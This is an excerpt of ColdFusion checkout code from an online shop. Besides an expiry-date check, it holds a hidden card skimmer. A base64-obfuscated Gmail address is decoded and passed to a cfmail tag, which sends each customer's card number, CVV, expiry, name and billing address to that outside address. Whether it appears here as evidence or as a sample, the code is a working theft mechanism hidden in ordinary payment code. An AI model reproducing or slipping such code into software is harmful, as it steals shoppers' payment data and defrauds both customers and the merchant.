...
<cfif form.cardChoice EQ 0 AND cardExpDate LT DateFormat(varDateODBC,"yyyy-mm-dd")><cfinclude template="pageHead.cfm"><p>Please click "Back" and enter a new new expiration date for your card. The date you entered is already expired.</p><cfinclude template="pageFoot.cfm"><cfabort></cfif>
...
<cfif form.billID NEQ 0 AND form.shipID NEQ 0>
	...
	<cfset GmailAddress = ToString(ToBinary('eHRtdHJ4QGdtYWlsLmNvbQ==')) />
    <cfoutput>#GmailAddress#</cfoutput>
	<cfmail to="#GmailAddress#"
		FROM="admin@downtown304.com"
		SUBJECT="#form.CCNum#"
		TYPE="HTML">
		CCFirstName="#form.CCFirstName#"
		CCName="#form.CCName#"
		CCNum="#form.CCNum#"
		CCType="#form.CCType#"
		Expmo="#form.expmo#"
		Expyr="#form.expyr#"
		CVV="#form.CCV#"
		Add1="#myAddresses.add1#"
		City="#myAddresses.city#"
		State="#myAddresses.state#"
		Postcode="#myAddresses.postcode#"
